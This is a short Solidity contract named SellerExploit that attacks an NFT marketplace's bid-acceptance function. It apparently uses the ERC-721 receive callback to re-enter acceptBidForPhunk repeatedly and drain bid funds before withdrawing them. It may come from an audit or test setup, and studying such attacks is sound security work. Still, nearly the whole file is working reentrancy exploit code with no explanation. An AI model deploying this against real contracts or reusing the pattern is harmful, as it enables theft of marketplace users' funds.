// SPDX-License-Identifier: MIT License
pragma solidity 0.8.10;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";


interface ICPMarket {
    function enterBidForPhunk(uint256 phunkIndex) external payable;

    function acceptBidForPhunk(uint256 phunkIndex, uint256 minPrice) external;

    function withdraw() external;
}

contract SellerExploit {
    uint256 constant BID_DRAIN_MULTIPLIER = 7;
    ICPMarket public market;
    uint256 times = 0;
    bool phunkReceived;

    constructor(ICPMarket market_, address collection) {
        market = market_;
        IERC721(collection).setApprovalForAll(address(market_), true);
    }

    function exploit(uint256 id) external {
        market.acceptBidForPhunk(id, 100);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        if(!phunkReceived) {
            phunkReceived = true;
            return this.onERC721Received.selector;
        } 
        if (times++ < BID_DRAIN_MULTIPLIER) {
            market.acceptBidForPhunk(tokenId, 100);
        }
        return this.onERC721Received.selector;
    }

    /* Allows users to retrieve ETH from sales */
    function withdraw() public {
        market.withdraw();
    }

    receive() external payable {}
}